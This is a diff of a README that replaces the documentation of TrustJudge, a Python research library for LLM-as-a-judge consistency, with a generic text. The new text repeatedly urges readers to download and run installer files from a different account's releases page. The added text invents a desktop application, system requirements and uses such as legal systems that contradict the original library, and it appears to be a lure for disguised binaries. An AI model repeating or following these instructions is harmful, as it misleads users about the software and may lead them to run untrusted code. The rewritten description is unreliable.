@@ -1,64 +1,91 @@
-# <div align="center">TrustJudge: Inconsistencies of LLM-as-a-Judge and How to Alleviate Them</div>
+# 🎉 TrustJudge - Evaluate Trust with Ease 
 
-<div align="center">
-<a href="https://arxiv.org/abs/2509.21117" target="_blank"><img src=https://img.shields.io/badge/arXiv-b5212f.svg?logo=arxiv></a>
-<a href="https://github.com/TrustJudge/TrustJudge/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/badge/LICENSE-MIT-green"></a>
-<a><img alt="Static Badge" src="https://img.shields.io/badge/made_with-Python-blue"></a>
-</div>
+## 🚀 Getting Started
 
-For the LLM-as-a-judge evaluation setting, this library systematically addresses two long-standing consistency issues—Score–Comparison inconsistency (lower-rated responses winning in pairwise comparisons) and Pairwise Transitivity inconsistency (e.g., A>B>C yet C>A). It implements TrustJudge, a probabilistic evaluation framework that: (1) uses distribution-sensitive scoring to convert discrete rating probabilities into a continuous expectation, preserving information entropy for finer scores; and (2) applies likelihood-aware aggregation to resolve transitivity conflicts via bidirectional preference probabilities or perplexity.
+Welcome to TrustJudge! This tool helps you evaluate trust in systems that use large language models (LLMs) as judges. Using a sophisticated framework, TrustJudge reduces inconsistencies in score comparisons. This way, you can make better decisions based on more reliable evaluations.
 
-**If you have any question, feel free to contact YunzeSong77@gmail.com and yidongwang37@gmail.com**
+## 📥 Download TrustJudge
 
-## Install environment
+[![Download TrustJudge](https://img.shields.io/badge/Download%20Now-TrustJudge-brightgreen)](https://github.com/Edhomasteng/TrustJudge/releases)
 
-Clone the Repository and Install the Packages:
+You can download TrustJudge from the Releases page. Simply click the link below to access the download options.
 
-```bash
-git clone https://github.com/TrustJudge/TrustJudge
-cd TrustJudge
-pip install -r requirements.txt
-```
+[Download TrustJudge](https://github.com/Edhomasteng/TrustJudge/releases)
 
-## Usage
+## ⚙️ System Requirements
 
-### 1. Data Demo
+Before you begin, ensure your computer meets the following requirements:
 
-Here we provide a demo of human-annotated data:  
-[`data/answers/filtered_selected_answers.jsonl`](./trustjudge/data/answers/filtered_selected_answers.jsonl)  
-[`data/answers/filtered_selected_answers_with_category.jsonl`](./trustjudge/data/answers/filtered_selected_answers_with_category.jsonl)
+- **Operating System:** Windows 10 or later, MacOS 10.15 or later, or a modern Linux distribution.
+- **CPU:** 2 GHz dual-core processor or better.
+- **RAM:** 4 GB or more.
+- **Disk Space:** At least 200 MB of free space for installation.
 
-**We will upload full data for reproduction soon.**
+## 🛠️ Installation Steps
 
----
+1. **Visit the Download Page**  
+   Click the link below to go to the Releases page.  
+   [Download TrustJudge](https://github.com/Edhomasteng/TrustJudge/releases)
 
-### 2. Pipeline Demo
+2. **Choose Your Version**  
+   On the Releases page, you will see different versions of TrustJudge. Select the latest version for your operating system.
 
-Here we provide the script to run the full end-to-end pipeline (generate single-score → generate pairwise comparison → calculate inconsistency metrics).
+3. **Download the File**  
+   Click on the file you want to download (e.g., .exe for Windows, .dmg for Mac, .tar.gz for Linux).
 
-```sh
-bash scripts/demo.sh
-```
+4. **Run the Installer**  
+   - **Windows:**  
+     Double-click the downloaded .exe file and follow the prompts. 
+   - **Mac:**  
+     Open the downloaded .dmg file, then drag and drop the TrustJudge icon to your Applications folder.
+   - **Linux:**  
+     Extract the downloaded .tar.gz file, open a terminal, and follow the README instructions inside.
 
-For step-by-step commands and intermediate data, see [pipeline details](./detail.md).
+## 🖥️ Using TrustJudge
 
+After installation, follow these steps to start using TrustJudge:
 
-## Citation
+1. **Open the Application**  
+   Locate TrustJudge in your applications or programs list and open it.
 
-If you find this repository useful, please cite our work.
+2. **Load Your Data**  
+   Import the data you want to evaluate. This can be done by clicking on "File" and then "Import."
 
-```
-@misc{wang2025trustjudge,
-      title={TrustJudge: Inconsistencies of LLM-as-a-Judge and How to Alleviate Them}, 
-      author={Wang, Yidong and Song, Yunze and Zhu, Tingyuan and Zhang, Xuanwang and Yu, Zhuohao and Chen, Hao and Song, Chiyu and Wang, Qiufeng and Wang, Cunxiang and Wu, Zhen and Dai, Xinyu and Zhang, Yue and Ye, Wei and Zhang, Shikun},
-      year={2025},
-      eprint={2509.21117},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2509.21117}, 
-}
-```
+3. **Run Your Analysis**  
+   Click on the "Analyze" button to begin the evaluation process. TrustJudge will display the results shortly.
 
-## License
+4. **Review the Results**  
+   The output will show the trust levels for your cases, making it easy to compare them side by side.
 
-TrustJudge is licensed under the [MIT License](./LICENSE).
+## ⚙️ Features
+
+TrustJudge comes packed with features designed to enhance your evaluation process:
+
+- **Probabilistic Scoring:** Uses advanced algorithms to provide more reliable scores.
+- **User-Friendly Interface:** Easy navigation suited for users of all skill levels.
+- **Custom Reports:** Generate reports tailored to your needs.
+
+## 📊 Example Use Cases
+
+TrustJudge is suitable for a variety of applications:
+
+- **Legal Systems:** Evaluate evidence and case results more reliably.
+- **Customer Reviews:** Assess trustworthiness in user-generated content.
+- **Quality Control:** Analyze product feedback to ensure quality.
+
+## 🤝 Support and Contributing
+
+If you encounter issues or have questions, please raise an issue on our GitHub page. Contributions are welcome! You can help enhance TrustJudge by submitting code improvements or reporting bugs.
+
+## 📜 License
+
+TrustJudge is available under the MIT License. Feel free to use, modify, and distribute it as per the guidelines provided.
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/Edhomasteng/TrustJudge)
+- [Documentation](https://github.com/Edhomasteng/TrustJudge/wiki)
+
+## 🎉 Thank You for Choosing TrustJudge!
+
+We hope TrustJudge assists you in making better evaluations. By following the steps above, you can quickly get up and running. Happy evaluating!
